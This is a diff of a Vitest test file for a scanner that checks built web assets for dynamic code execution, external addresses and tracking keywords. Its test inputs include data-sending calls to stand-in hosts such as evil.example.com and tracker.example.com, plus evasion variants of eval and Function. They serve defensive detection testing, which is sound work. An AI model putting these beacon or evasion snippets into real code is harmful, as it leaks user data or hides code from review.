@@ -3,10 +3,22 @@ import { describe, expect, it } from 'vitest'
 import { checkFileTypes, checkTestOnlyArtifacts, classifyArtifact, scanArtifacts } from './artifacts.ts'
 import { ARTIFACT_POLICY } from './policy.ts'
 
-const policy: ArtifactPolicy = { ...ARTIFACT_POLICY, allowedHosts: { 'www.w3.org': 'SVG 命名空间' }, globalThisProbeMax: 1 }
+const policy: ArtifactPolicy = {
+  ...ARTIFACT_POLICY,
+  allowedAddresses: [
+    { address: 'http://www.w3.org/2000/svg', source: '样例', reason: 'SVG 的命名空间' },
+    { address: 'http://www.w3.org/1999/xhtml', source: '样例', reason: 'XHTML 的命名空间' },
+    { address: 'http://localhost', source: '样例', reason: '解析相对地址的基准' },
+  ],
+  globalThisProbeMax: 1,
+}
+
+function scan(content: string, path = 'assets/index.js') {
+  return scanArtifacts([{ path, content }], policy)
+}
 
 function rules(content: string, path = 'assets/index.js'): string[] {
-  return scanArtifacts([{ path, content }], policy).violations.map(v => v.rule)
+  return scan(content, path).violations.map(v => v.rule)
 }
 
 describe('US-M1-11 A01 产物扫描：动态代码', () => {
@@ -36,10 +48,34 @@ describe('US-M1-11 A01 产物扫描：动态代码', () => {
     expect(rules(code)).toContain('artifacts/dynamic-code')
   })
 
+  it.each([
+    ['先把 Function 赋给变量再 new（zod 源码里的写法）', 'let F=Function;new F(code)'],
+    ['先把 Function 赋给变量再调用', 'const F=Function;F(code)()'],
+    ['全局对象上的 Function 赋给变量', 'const F=globalThis.Function;F(code)()'],
+    ['Reflect.construct 的参数', 'Reflect.construct(Function,[code])'],
+    ['Function 的 apply', 'Function.apply(null,[code])'],
+    ['eval 赋给变量', 'const e=eval;e(code)'],
+    ['标签模板', 'Function`return 1`'],
+    ['标识符里的转义', '\\u0065val(code)'],
+  ])('违规（审查 B3）：%s', (_case, code) => {
+    expect(rules(code)).toContain('artifacts/dynamic-code')
+  })
+
+  it('没有语法树的文本文件（HTML 等）仍按写法匹配 eval 与 Function', () => {
+    expect(rules('<script>eval(x)</script>', 'index.html')).toContain('artifacts/dynamic-code')
+    expect(rules('<svg onload="new Function(x)()"></svg>', 'assets/logo.svg')).toContain('artifacts/dynamic-code')
+    expect(rules('<p>Function("return this")</p>', 'index.html')).toEqual([])
+  })
+
+  it('违规：JS 文件解析失败时不当作没有动态代码', () => {
+    expect(rules('let x = ;')).toEqual(['artifacts/unparsable'])
+  })
+
   it('合规：常见的正常写法不误报', () => {
     const code = [
-      'a.evaluate(x);b.myFunction("x");obj.eval2=1;isFunction("x");',
+      'a.evaluate(x);b.myFunction("x");obj.eval2=1;isFunction("x");node.eval(scope);',
       'typeof f==="function";x instanceof Function;Function.prototype.call.bind(f);',
+      'const tag="[object Function]";const kinds=["AsyncFunction","GeneratorFunction"];',
       'setTimeout(fn,0);self.setTimeout(()=>{},1);',
       'new Worker(new URL("./formula.worker-abc.js",import.meta.url),{type:"module"});',
       'var s="//";var t="a//b";',
@@ -52,12 +88,32 @@ describe('US-M1-11 A01 产物扫描：动态代码', () => {
     expect(rules('Function("return this")();Function(\'return this\')();')).toEqual(['artifacts/global-this-probe'])
   })
 
-  it('已登记的能力探测（空字符串的 Function）：次数以内不算动态代码，超过上限即违规；带内容的仍是动态代码', () => {
-    expect(rules('try{return Function(``),!0}catch{return!1}')).toEqual([])
-    expect(rules('try{new F(""),Function(``)}catch{}')).toEqual([])
-    expect(rules('Function(``);Function(\'\')')).toEqual(['artifacts/known-probe'])
+  it('已登记的 zod JIT 探测（空字符串的 Function）：次数以内不算动态代码，超过上限即违规；带内容的、先赋给变量的仍是动态代码', () => {
+    expect(rules('var L=jo(()=>{if(zs.jitless)return!1;try{return Function(``),!0}catch{return!1}})')).toEqual([])
+    expect(rules('Function(``);Function(\'\')')).toEqual(['artifacts/known-dynamic-code'])
     expect(rules('Function(`x`)')).toContain('artifacts/dynamic-code')
     expect(rules('new Function(``+code)')).toContain('artifacts/dynamic-code')
+    // 登记的是压缩后的原文 Function(``)；源码里先赋给变量的写法不在登记范围里（审查 B3）
+    expect(rules('const F=Function;try{new F("")}catch{}')).toContain('artifacts/dynamic-code')
+  })
+
+  // 生产产物里 zod 的 Doc.compile 原文（压缩后）；样例是产物原文，不是要插值
+  // eslint-disable-next-line no-template-curly-in-string
+  const zodCompiler = 'var pl=class{compile(){let e=Function,t=this?.content??[``];return new e(...Object.keys(this.closed),`return function (${this.args.join(`, `)}) {\\n${t.join(`\n`)}\\n};`)(...Object.values(this.closed))}};'
+
+  it('已登记的 zod JIT 编译器：原文以内不算动态代码，并计数；出现两次即违规；别处把 Function 赋给变量仍然违规', () => {
+    const scan = scanArtifacts([{ path: 'assets/index.js', content: zodCompiler }], policy)
+    expect(scan.violations).toEqual([])
+    expect(scan.knownDynamicCode).toEqual(new Map([['zod 的 JIT 探测', 0], ['zod 的 JIT 编译器', 1]]))
+    expect(rules(zodCompiler + zodCompiler.replace('pl=', 'pm='))).toEqual(['artifacts/known-dynamic-code'])
+    expect(rules('var pl=class{compile(){let e=Function;return e(this.code)}};')).toContain('artifacts/dynamic-code')
+  })
+
+  it('没有登记时，zod 的 JIT 编译器报为动态代码（审查 B3：P1 起漏检）', () => {
+    const unregistered = { ...policy, knownDynamicCode: policy.knownDynamicCode.filter(known => known.name !== 'zod 的 JIT 编译器') }
+    const { violations } = scanArtifacts([{ path: 'assets/index.js', content: zodCompiler }], unregistered)
+    expect(violations.map(v => v.rule)).toEqual(['artifacts/dynamic-code'])
+    expect(violations[0]?.detail).toContain('let e=Function')
   })
 })
 
@@ -68,30 +124,84 @@ describe('US-M1-11 A01 产物扫描：外部地址与关键字', () => {
     ['wss', 'new WebSocket("wss://t.example.com/s")'],
     ['协议相对地址', 'fetch("//evil.example.com/collect")'],
     ['JSON 转义的斜杠', 'JSON.parse("{\\"u\\":\\"https:\\\\/\\\\/evil.example.com\\"}")'],
-    ['CSS 里的外部地址', 'body{background:url(https://cdn.example.net/bg.png)}'],
   ])('违规：%s', (_case, code) => {
-    expect(rules(code)).toContain('artifacts/host')
+    expect(rules(code)).toContain('artifacts/address')
   })
 
-  it('合规：模板字符串里在运行时拼出的地址（没有固定的主机），由 CSP 兜底', () => {
-    // 样例就是产物里的模板字符串原文，不是要插值
-    // eslint-disable-next-line no-template-curly-in-string
-    expect(rules('return Sl(`http://[${e}]`)')).toEqual([])
-    // eslint-disable-next-line no-template-curly-in-string
-    expect(rules('const u=`https://${host}/x`')).toEqual([])
+  it('违规：CSS 里的外部地址', () => {
+    expect(rules('body{background:url(https://cdn.example.net/bg.png)}', 'assets/x.css')).toEqual(['artifacts/address'])
   })
 
-  it('合规：允许清单里的主机（不区分大小写）', () => {
-    expect(rules('const ns="http://www.w3.org/2000/svg";const x="HTTP://WWW.W3.ORG/1999/xhtml"')).toEqual([])
+  it('违规：解析不了的主机照样报出，原样记进主机汇总', () => {
+    const result = scan('fetch("https://exa%mple.com/x")')
+    expect(result.violations.map(v => v.rule)).toEqual(['artifacts/address'])
+    expect([...result.hosts.keys()]).toEqual(['exa%mple.com'])
+  })
+
+  // 以下样例都是产物里的模板字符串原文，不是要插值
+  /* eslint-disable no-template-curly-in-string */
+  it.each([
+    ['查询里的插值', 'fetch(`https://tracker.example.com/collect?u=${user}`)', 'tracker.example.com'],
+    ['路径里的插值', 'img.src=`https://evil.example/${id}.gif`', 'evil.example'],
+    ['WebSocket 路径里的插值', 'new WebSocket(`wss://t.example.com/s/${room}`)', 't.example.com'],
+    ['主机以插值开头、后面是固定的域名', 'fetch(`https://${region}.tracker.example.com/e`)', '*.tracker.example.com'],
+    ['用户信息是插值、主机固定', 'fetch(`https://${key}@o1.ingest.example.io/1`)', 'o1.ingest.example.io'],
+  ])('违规（审查 B2）：主机固定、插值在后面时，按主机检查：%s', (_case, code, host) => {
+    const result = scan(code)
+    expect(result.violations.map(v => v.rule)).toEqual(['artifacts/address'])
+    expect([...result.hosts.keys()]).toEqual([host])
+  })
+
+  it('合规：主机本身在运行时拼出（插值紧跟在 // 或 //[ 之后），看不到主机，由 CSP 兜底，单独计数', () => {
+    const result = scan('function Ul(e){return Sl(`http://[${e}]`)};const u=`https://${host}/x`;const w=`wss://${host}:${port}/ws`')
+    expect(result.violations).toEqual([])
+    expect(result.hosts).toEqual(new Map())
+    expect(result.runtimeHosts).toBe(3)
+  })
+
+  it('违规：主机或端口里有插值时，允许清单不适用（实际的地址不止这段固定部分）', () => {
+    expect(rules('const a=`http://localhost${suffix}`')).toEqual(['artifacts/address'])
+    expect(rules('const a=`http://localhost:${port}`')).toEqual(['artifacts/address'])
+  })
+
+  it('合规：允许清单里的地址后面拼上路径（与字符串拼接的写法一样）', () => {
+    const code = 'function n(e){return`https://react.dev/errors/${e}`}function m(e){return`https://react.dev/errors/`+e}'
+    expect(scanArtifacts([{ path: 'assets/index.js', content: code }], ARTIFACT_POLICY).violations).toEqual([])
+  })
+  /* eslint-enable no-template-curly-in-string */
+
+  it('合规：允许清单里的地址（协议与主机不区分大小写，句末的句点不算，JSON 转义的斜杠也认得）', () => {
+    expect(rules('const ns="http://www.w3.org/2000/svg";const x="HTTP://WWW.W3.ORG/1999/xhtml";const m="See http://localhost."')).toEqual([])
+    expect(rules('const j="{\\"ns\\":\\"http:\\\\/\\\\/www.w3.org\\\\/2000\\\\/svg\\"}"')).toEqual([])
+  })
+
+  it.each([
+    ['同一个主机上的其他地址', 'fetch("http://www.w3.org/collect?id=1")'],
+    ['协议不同', 'const ns="https://www.w3.org/2000/svg"'],
+    ['路径区分大小写', 'const ns="http://www.w3.org/1999/XHTML"'],
+    ['登记的地址后面加上路径', 'fetch("http://localhost/api/collect")'],
+    ['登记的地址加上端口', 'fetch("http://localhost:8080")'],
+  ])('违规（审查 B21）：按具体地址放行，不按主机：%s', (_case, code) => {
+    expect(rules(code)).toEqual(['artifacts/address'])
   })
 
   it.each(['Sentry.init({dsn:d})', 'new PostHog()', 'o.license_key="x"', 'o.licenseKey="x"', 'import("@univerjs-pro/license")', 'https://www.googletagmanager.com/gtag/js'])('违规：关键字（不区分大小写）%s', (code) => {
     expect(rules(code)).toContain('artifacts/keyword')
   })
 
-  it('汇总出现过的主机，便于审查允许清单', () => {
-    const { hosts } = scanArtifacts([{ path: 'a.js', content: '"http://www.w3.org/1999/xhtml" "http://www.w3.org/2000/svg"' }], policy)
-    expect(hosts).toEqual(new Map([['www.w3.org', 2]]))
+  it('汇总出现过的主机与允许清单里这次没出现的地址，便于审查允许清单', () => {
+    const result = scan('a="http://www.w3.org/1999/xhtml";b="http://www.w3.org/2000/svg"')
+    expect(result.hosts).toEqual(new Map([['www.w3.org', 2]]))
+    expect(result.unusedAddresses).toEqual(['http://localhost'])
+  })
+
+  it('真实的允许清单：每一项都是合法的绝对地址，写明来源与用途，没有重复', () => {
+    const { allowedAddresses } = ARTIFACT_POLICY
+    for (const entry of allowedAddresses) {
+      expect(() => new URL(entry.address), entry.address).not.toThrow()
+      expect(entry.source.length > 0 && entry.reason.length > 0, entry.address).toBe(true)
+    }
+    expect(new Set(allowedAddresses.map(entry => entry.address.toLowerCase())).size).toBe(allowedAddresses.length)
   })
 })
 
